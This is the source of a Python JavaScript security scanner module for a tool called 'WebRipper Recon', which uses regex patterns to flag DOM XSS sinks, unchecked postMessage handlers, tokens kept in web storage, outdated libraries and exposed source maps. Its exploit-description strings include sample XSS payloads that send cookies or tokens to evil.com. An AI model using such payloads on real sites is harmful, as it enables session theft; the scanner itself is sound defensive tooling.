"""
JavaScript security scanner for WebRipper Recon.

Scans downloaded JS/TS files for DOM XSS sinks, dangerous functions,
sensitive storage, outdated libraries, and source map exposure.
"""

from __future__ import annotations

import os
import re
import time
from typing import List, Tuple

from .base import BaseScanner
from ..models import Finding, ScanResult, Severity

_JS_EXTENSIONS = (".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".vue", ".svelte")

# ---------------------------------------------------------------------------
# DOM XSS sinks
# ---------------------------------------------------------------------------

_XSS_SINKS: List[Tuple[str, re.Pattern, Severity, str, str, str]] = [
    # (title, pattern, severity, description, exploit, cwe)
    (
        "innerHTML assignment",
        re.compile(r"""\.innerHTML\s*[+]?=\s*(?!["'`][^"'`]*["'`]\s*;?$)"""),
        Severity.HIGH,
        "Direct innerHTML assignment with dynamic data enables DOM-based XSS.",
        "Attacker crafts URL with payload: ?param=<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)> — if the parameter reaches innerHTML, arbitrary JS executes in the victim's browser, stealing cookies, keylogging, or injecting phishing forms.",
        "CWE-79",
    ),
    (
        "outerHTML assignment",
        re.compile(r"""\.outerHTML\s*[+]?="""),
        Severity.HIGH,
        "outerHTML assignment with user input enables DOM-based XSS.",
        "Same as innerHTML — attacker injects HTML that replaces DOM elements. Can inject script tags or event handlers to execute arbitrary code.",
        "CWE-79",
    ),
    (
        "document.write() call",
        re.compile(r"""document\.write\s*\("""),
        Severity.HIGH,
        "document.write() with dynamic data enables DOM-based XSS.",
        "Attacker injects script via URL parameter that reaches document.write(). Browser parses injected HTML/JS, executing attacker's code with full page access.",
        "CWE-79",
    ),
    (
        "eval() call",
        re.compile(r"""\beval\s*\("""),
        Severity.HIGH,
        "eval() executes arbitrary code strings — a critical injection sink.",
        "If user-controllable data reaches eval(), attacker achieves arbitrary JS execution: eval(userInput) where userInput = 'fetch(\"https://evil.com/steal\",{method:\"POST\",body:document.cookie})' — full browser compromise.",
        "CWE-95",
    ),
    (
        "Function() constructor",
        re.compile(r"""\bFunction\s*\("""),
        Severity.HIGH,
        "Function() constructor creates functions from strings — equivalent to eval().",
        "new Function(userInput)() executes arbitrary code. Attacker provides code string that steals data, modifies DOM, or redirects user.",
        "CWE-95",
    ),
    (
        "setTimeout with string argument",
        re.compile(r"""\bsetTimeout\s*\(\s*(?:['"`]|(?:[a-zA-Z0-9_$.]+\s*\+)|(?:string|code|payload|data|input|cmd|buf|msg|eval|val|param|user)\b)""", re.IGNORECASE),
        Severity.MEDIUM,
        "setTimeout() with string argument acts like eval().",
        "setTimeout('alert(1)', 0) executes the string as code. If user input reaches the string argument, attacker gets code execution.",
        "CWE-95",
    ),
    (
        "setInterval with string argument",
        re.compile(r"""\bsetInterval\s*\(\s*(?:['"`]|(?:[a-zA-Z0-9_$.]+\s*\+)|(?:string|code|payload|data|input|cmd|buf|msg|eval|val|param|user)\b)""", re.IGNORECASE),
        Severity.MEDIUM,
        "setInterval() with string argument acts like eval().",
        "Same as setTimeout — string arguments are executed as code repeatedly.",
        "CWE-95",
    ),
    (
        "jQuery .html() assignment",
        re.compile(r"""\.html\s*\(\s*(?!["'`][a-zA-Z0-9_\s-]*["'`]\s*\))[^)]+"""),
        Severity.HIGH,
        "jQuery .html() with dynamic content enables DOM-based XSS.",
        "Attacker injects HTML via parameter into jQuery's .html() method, executing arbitrary script in the victim's context.",
        "CWE-79",
    ),
]

# ---------------------------------------------------------------------------
# Dangerous patterns
# ---------------------------------------------------------------------------

_DANGEROUS_PATTERNS: List[Tuple[str, re.Pattern, Severity, str, str, str]] = [
    (
        "postMessage without origin check",
        re.compile(r"""addEventListener\s*\(\s*['"]message['"]"""),
        Severity.MEDIUM,
        "Message event listener may accept messages from any origin without validation.",
        "Attacker opens target in iframe and sends crafted postMessage from evil.com. If the handler doesn't check event.origin, attacker controls the message data — potentially triggering XSS, navigation, or data exfiltration.",
        "CWE-346",
    ),
    (
        "location.href assignment from input",
        re.compile(r"""(?:(?:window\.)?location(?:\.href)?\s*=\s*(?!['"])|(?:location\.replace|location\.assign|window\.open)\s*\(\s*(?!['"]))"""),
        Severity.MEDIUM,
        "Dynamic URL redirect — potential open redirect or javascript: URI injection.",
        "Attacker crafts: ?redirect=javascript:fetch('https://evil.com/steal?c='+document.cookie). If the parameter reaches location.href, the JS executes. Even without javascript:, open redirects enable phishing: victim sees trusted domain, gets sent to evil.com login page.",
        "CWE-601",
    ),
    (
        "localStorage storing sensitive data",
        re.compile(r"""localStorage\.setItem\s*\(\s*['"](?:token|auth|session|jwt|password|secret|api_key|access_token|refresh_token|credential)""", re.IGNORECASE),
        Severity.HIGH,
        "Sensitive data stored in localStorage — accessible to any XSS and never expires.",
        "localStorage is accessible via document.cookie-equivalent: any XSS on the domain reads ALL localStorage data. Unlike cookies with HttpOnly, there's NO protection. Attacker's XSS payload: fetch('https://evil.com/steal?token='+localStorage.getItem('token'))",
        "CWE-922",
    ),
    (
        "sessionStorage storing sensitive data",
        re.compile(r"""sessionStorage\.setItem\s*\(\s*['"](?:token|auth|session|jwt|password|secret|api_key|access_token)""", re.IGNORECASE),
        Severity.MEDIUM,
        "Sensitive data in sessionStorage — accessible to XSS within the tab's lifetime.",
        "Same risk as localStorage but limited to the tab session. Any XSS reads it: sessionStorage.getItem('token'). Less severe because it doesn't persist across tabs.",
        "CWE-922",
    ),
]

# ---------------------------------------------------------------------------
# Outdated library detection
# ---------------------------------------------------------------------------

_LIB_PATTERNS: List[Tuple[str, re.Pattern, str, str, str]] = [
    (
        "jQuery",
        re.compile(r"""jquery[./\s-]v?(\d+\.\d+(?:\.\d+)?)""", re.IGNORECASE),
        "3.5.0",
        "jQuery < 3.5.0 has XSS vulnerabilities (CVE-2020-11022, CVE-2020-11023) in .html() and .append() methods.",
        "CWE-79",
    ),
    (
        "Angular.js",
        re.compile(r"""angular(?:\.min)?\.js.*?(\d+\.\d+\.\d+)""", re.IGNORECASE),
        "1.6.0",
        "AngularJS < 1.6 has sandbox escape vulnerabilities allowing template injection → XSS.",
        "CWE-79",
    ),
    (
        "Lodash",
        re.compile(r"""lodash(?:\.min)?\.js.*?(\d+\.\d+\.\d+)""", re.IGNORECASE),
        "4.17.21",
        "Lodash < 4.17.21 has prototype pollution (CVE-2021-23337) enabling RCE in some contexts.",
        "CWE-1321",
    ),
    (
        "Moment.js",
        re.compile(r"""moment(?:\.min)?\.js.*?(\d+\.\d+\.\d+)""", re.IGNORECASE),
        "2.29.4",
        "Moment.js < 2.29.4 has ReDoS vulnerability (CVE-2022-31129) and is deprecated.",
        "CWE-1333",
    ),
    (
        "Bootstrap",
        re.compile(r"""bootstrap(?:\.min)?\.(?:js|css).*?v?(\d+\.\d+\.\d+)""", re.IGNORECASE),
        "5.2.0",
        "Bootstrap < 5.2 has XSS vulnerabilities in tooltip and popover components.",
        "CWE-79",
    ),
]


def _version_lt(v1: str, v2: str) -> bool:
    """Check if version v1 < v2 with numeric zero-padding."""
    try:
        p1 = [int(x) for x in v1.split(".")]
        p2 = [int(x) for x in v2.split(".")]
        max_len = max(len(p1), len(p2))
        p1.extend([0] * (max_len - len(p1)))
        p2.extend([0] * (max_len - len(p2)))
        return p1 < p2
    except (ValueError, AttributeError):
        return False


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class JavaScriptScanner(BaseScanner):
    """Scans JS files for DOM XSS sinks, dangerous patterns, and outdated libraries."""

    @property
    def name(self) -> str:
        return "javascript"

    @property
    def description(self) -> str:
        return "Scans for DOM XSS sinks, dangerous functions, sensitive storage, and outdated libraries"

    def scan(self) -> ScanResult:
        start = time.time()
        js_files = self._get_downloaded_files(extensions=_JS_EXTENSIONS)
        self._log(f"Scanning {len(js_files)} JavaScript files...")

        for f in js_files:
            self._scan_file(f.local_path, f.url)

        # Scan inline scripts and event handlers from HTML files
        html_files = []
        all_files = getattr(self._report, "files", None) or getattr(self._report, "downloaded_files", None) or []
        for f in all_files:
            if getattr(f, "error", "") or not getattr(f, "local_path", ""):
                continue
            lower = f.local_path.lower()
            ct = getattr(f, "content_type", "").lower()
            if any(lower.endswith(ext) for ext in (".html", ".htm", ".php", ".asp", ".aspx", ".jsp")) or "text/html" in ct or "." not in os.path.basename(f.local_path):
                html_files.append(f)

        self._scan_html_inline_scripts(html_files)

        # Check for source maps
        self._check_source_maps()

        self._log(f"JS scan complete: {len(self._findings)} findings")
        return self._build_result(start, files_scanned=len(js_files) + len(html_files))

    def _scan_html_inline_scripts(self, html_files: list) -> None:
        """Extract and scan inline <script> blocks and on* event handler attributes from HTML files."""
        for hf in html_files:
            try:
                if not os.path.isfile(hf.local_path):
                    continue
                size = os.path.getsize(hf.local_path)
                if size > 2_000_000:
                    continue
                with open(hf.local_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()

                from bs4 import BeautifulSoup
                soup = BeautifulSoup(content, "html.parser")

                # Scan inline <script> tags
                script_idx = 0
                for script in soup.find_all("script"):
                    if script.get("src"):
                        continue
                    script_type = (script.get("type") or "").lower()
                    if any(t in script_type for t in ("json", "ld+json", "importmap")):
                        continue
                    script_body = script.get_text()
                    if not script_body.strip():
                        continue
                    script_idx += 1
                    virtual_url = f"{hf.url}#inline-script-{script_idx}"
                    virtual_fp = f"{hf.local_path}#inline-script-{script_idx}"
                    for line_num, line in enumerate(script_body.splitlines(), 1):
                        self._check_xss_sinks(line, virtual_fp, virtual_url, line_num)
                        self._check_dangerous(line, virtual_fp, virtual_url, line_num)

                # Scan inline on* event handler attributes
                for tag in soup.find_all(True):
                    for attr, val in tag.attrs.items():
                        if attr.lower().startswith("on") and isinstance(val, str) and val.strip():
                            virtual_url = f"{hf.url}#{tag.name}[{attr}]"
                            virtual_fp = f"{hf.local_path}#{tag.name}[{attr}]"
                            self._check_xss_sinks(val, virtual_fp, virtual_url, 1)
                            self._check_dangerous(val, virtual_fp, virtual_url, 1)
            except Exception as e:
                self._log(f"Error scanning inline scripts in {hf.url}: {e}")

    def _scan_file(self, filepath: str, url: str) -> None:
        try:
            size = os.path.getsize(filepath)
            if size > 2_000_000:
                return

            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                for line_num, line in enumerate(f, 1):
                    self._check_xss_sinks(line, filepath, url, line_num)
                    self._check_dangerous(line, filepath, url, line_num)
                    if line_num <= 20:
                        self._check_libraries(line, filepath, url)
        except (OSError, IOError):
            pass

    def _check_xss_sinks(self, line: str, fp: str, url: str, ln: int) -> None:
        for title, pattern, severity, desc, exploit, cwe in _XSS_SINKS:
            if pattern.search(line):
                self._add_finding(Finding(
                    severity=severity,
                    category="javascript",
                    title=title,
                    description=desc,
                    evidence=line.strip()[:200],
                    file_path=fp,
                    line_number=ln,
                    url=url,
                    remediation="Use textContent instead of innerHTML. Sanitize all user input before DOM insertion. Use DOMPurify for HTML sanitization.",
                    metadata={
                        "exploit": exploit,
                        "impact": "Arbitrary JavaScript execution in victim's browser — session hijacking, data theft, account takeover",
                        "cwe": cwe,
                        "owasp": "A03:2021 Injection",
                        "time_to_exploit": "~10 minutes if user input reaches this sink",
                    },
                ))

    def _check_dangerous(self, line: str, fp: str, url: str, ln: int) -> None:
        for title, pattern, severity, desc, exploit, cwe in _DANGEROUS_PATTERNS:
            if pattern.search(line):
                self._add_finding(Finding(
                    severity=severity,
                    category="javascript",
                    title=title,
                    description=desc,
                    evidence=line.strip()[:200],
                    file_path=fp,
                    line_number=ln,
                    url=url,
                    remediation="Validate and sanitize all external input. Check event.origin for postMessage. Use allowlists for redirects.",
                    metadata={
                        "exploit": exploit,
                        "impact": "Varies: XSS, open redirect, data theft, or session hijacking",
                        "cwe": cwe,
                        "owasp": "A03:2021 Injection",
                        "time_to_exploit": "~15 minutes",
                    },
                ))

    def _check_libraries(self, line: str, filepath: str, url: str) -> None:
        for lib_name, pattern, safe_ver, desc, cwe in _LIB_PATTERNS:
            m = pattern.search(line)
            if m:
                version = m.group(1)
                if _version_lt(version, safe_ver):
                    self._add_finding(Finding(
                        severity=Severity.MEDIUM,
                        category="javascript",
                        title=f"Outdated {lib_name} ({version} < {safe_ver})",
                        description=desc,
                        evidence=f"{lib_name} version {version} detected (safe: >= {safe_ver})",
                        file_path=filepath,
                        url=url,
                        remediation=f"Update {lib_name} to version {safe_ver} or later. Check the changelog for breaking changes.",
                        metadata={
                            "exploit": f"Known CVEs exist for {lib_name} < {safe_ver}. Attackers use automated scanners to detect outdated libraries and apply known exploits. Public exploit code is typically available on GitHub.",
                            "impact": f"Depends on the specific CVE — typically XSS, prototype pollution, or ReDoS",
                            "cwe": cwe,
                            "owasp": "A06:2021 Vulnerable and Outdated Components",
                            "time_to_exploit": "~5 minutes with known exploit",
                        },
                    ))

    def _check_source_maps(self) -> None:
        map_files = self._get_downloaded_files(extensions=(".map",))
        for f in map_files:
            self._add_finding(Finding(
                severity=Severity.MEDIUM,
                category="javascript",
                title="Source map file exposed",
                description="Source map exposes the original, unminified source code including comments, variable names, and file structure.",
                evidence=f"Source map: {os.path.basename(f.local_path)} ({os.path.getsize(f.local_path)} bytes)",
                file_path=f.local_path,
                url=f.url,
                remediation="Remove .map files from production servers. Configure build tools to not generate source maps for production, or restrict access via server configuration.",
                metadata={
                    "exploit": "Attacker downloads the .map file and reconstructs the full original source code using 'source-map-explorer' or browser DevTools. This reveals: internal API endpoints, business logic, authentication flows, commented-out debug code, internal documentation, and potentially hardcoded secrets that were 'hidden' by minification.",
                    "impact": "Full source code disclosure — reveals attack surface, internal architecture, and potentially secrets",
                    "cwe": "CWE-540",
                    "owasp": "A05:2021 Security Misconfiguration",
                    "time_to_exploit": "~2 minutes",
                },
            ))
